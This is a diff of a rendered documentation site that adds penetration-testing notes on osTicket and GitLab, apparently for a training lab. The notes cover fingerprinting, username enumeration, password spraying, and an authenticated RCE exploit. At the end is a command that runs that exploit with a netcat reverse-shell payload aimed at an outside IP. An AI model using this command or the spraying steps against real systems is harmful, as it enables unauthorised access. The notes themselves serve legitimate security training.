@@ -1307,6 +1307,87 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#osticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      osTicket
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="osTicket">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#footprintingdiscoveryenumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Footprinting/Discovery/Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gitlab" class="md-nav__link">
+    <span class="md-ellipsis">
+      Gitlab
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Gitlab">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#discovery-enumeration_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Discovery &amp; Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-gitlab" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking GitLab
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attacking GitLab">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#username-enumerationpassword-spray" class="md-nav__link">
+    <span class="md-ellipsis">
+      Username Enumeration/Password Spray
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#authenticated-remote-code-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Authenticated Remote Code Execution
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -1951,6 +2032,87 @@
   <a href="#discoveryfootprintingenumeration" class="md-nav__link">
     <span class="md-ellipsis">
       Discovery/Footprinting/Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#osticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      osTicket
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="osTicket">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#footprintingdiscoveryenumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Footprinting/Discovery/Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gitlab" class="md-nav__link">
+    <span class="md-ellipsis">
+      Gitlab
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Gitlab">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#discovery-enumeration_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Discovery &amp; Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-gitlab" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking GitLab
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attacking GitLab">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#username-enumerationpassword-spray" class="md-nav__link">
+    <span class="md-ellipsis">
+      Username Enumeration/Password Spray
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#authenticated-remote-code-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Authenticated Remote Code Execution
     </span>
   </a>
   
@@ -2755,6 +2917,36 @@
 <li>Default creds <code>prtgadmin:prtgadmin</code></li>
 <li>Try weak passwords for <code>prtgadmin</code></li>
 <li>Try know exploits for version</li>
+</ul>
+<h2 id="osticket">osTicket</h2>
+<h3 id="footprintingdiscoveryenumeration">Footprinting/Discovery/Enumeration</h3>
+<ul>
+<li>Can show up in Eyewitness report which can contain <code>OSTSESSID</code> cookie</li>
+<li>Page footers may show "powered by osTicket" or "Support Ticket System"</li>
+<li>Will not show up in nmap scan</li>
+</ul>
+<h2 id="gitlab">Gitlab</h2>
+<h3 id="discovery-enumeration_1">Discovery &amp; Enumeration</h3>
+<ul>
+<li>Browse to <code>gitlab.&lt;domain&gt;</code> to discover if a gitlab instance is running</li>
+<li>Try registering an account or signing in with other found credentials/try low risk exploit such as <a href="https://www.exploit-db.com/exploits/49821">this</a> or its <a href="https://github.com/dpgg101/GitLabUserEnum">python3 version</a></li>
+<li>Can also use the registration form to enumerate valid users <code>/users/sign_up</code> will show already taken usernames</li>
+<li>Browse to <code>/help</code> to discover version number</li>
+<li>Once logged in browse to <code>/explore</code> to dig through public projects for anything of interest</li>
+<li>Check the other tabs <code>groups</code>, <code>snippets</code>, and <code>help</code></li>
+</ul>
+<h3 id="attacking-gitlab">Attacking GitLab</h3>
+<h4 id="username-enumerationpassword-spray">Username Enumeration/Password Spray</h4>
+<ul>
+<li>10 minute lockout after 10 failed login attempts by default</li>
+<li>Controlled password spray with weak passwords against found usernames</li>
+</ul>
+<h3 id="authenticated-remote-code-execution">Authenticated Remote Code Execution</h3>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/49951">Exploit</a> for GitLab Community Edition version 13.10.2 and lower</li>
+<li>Requires valid username and password (may work with self-registered credentials)
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-57-1">python3<span class="w"> </span>gitlab_13_10_2_rce.py<span class="w"> </span>-t<span class="w"> </span>http://gitlab.inlanefreight.local:8081<span class="w"> </span>-u<span class="w"> </span>Testface<span class="w"> </span>-p<span class="w"> </span>Testface<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.15 8443 &gt;/tmp/f &#39;</span>
+</span></code></pre></div></td></tr></table></div></li>
 </ul>
 
 
